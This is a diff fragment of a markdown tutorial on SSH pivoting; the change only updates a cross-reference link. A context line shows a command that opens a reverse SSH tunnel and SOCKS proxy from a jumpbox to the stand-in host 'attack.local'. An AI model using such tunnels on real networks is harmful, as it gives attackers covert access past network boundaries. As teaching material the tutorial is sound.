@@ -115,7 +115,7 @@ they@jumpbox1.local:~$ ssh -f -R 2222:127.0.0.1:22 attack.local "ssh -f -N -D 88
 ```
 And magic happens...
 
-And from here, you'd do the rest as shown before.
+And from here, you'd do the rest as shown in [part 2 from above](#but-we-still-cant-talk-to-destboxlocal-).
 
 ## Demo Round 2
 
